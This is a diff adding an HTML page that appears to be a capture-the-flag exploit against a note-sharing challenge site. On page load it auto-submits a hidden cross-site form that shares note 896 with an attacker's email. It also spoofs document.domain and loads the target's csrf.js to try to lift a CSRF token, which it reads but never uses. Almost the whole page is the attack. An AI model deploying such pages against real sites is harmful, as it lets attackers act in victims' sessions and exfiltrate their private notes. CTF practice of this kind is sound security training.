@@ -1,0 +1,35 @@
+<html>
+<head>
+	<meta name="referrer" content="no-referrer">
+	<script  src="https://code.jquery.com/jquery-3.3.1.min.js"
+  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+  crossorigin="anonymous"></script>
+</head>
+
+<body>
+	
+	<form method="post" action="https://yeunote.ctf.yeuchimse.com/note/add_share/896" target="add_share">
+		<input name="emails" value="my_email@foo.com"/>
+		<input type="submit" value="submit">
+	</form>
+
+	<script>Object.defineProperty(document, 'domain', {value: "yeunote.ctf.yeuchimse.com"});</script>
+	<script src="https://yeunote.ctf.yeuchimse.com/csrf.js"></script>
+
+
+	<iframe name = 'add_share'></iframe>
+
+	<script>
+		function send(){
+			document.forms[0].submit();
+		}
+		function main(){
+			var crsf = document.querySelector('input[type=hidden]').value;
+			send()
+		}
+
+		window.onload = main
+	</script>
+
+</body>
+</html>
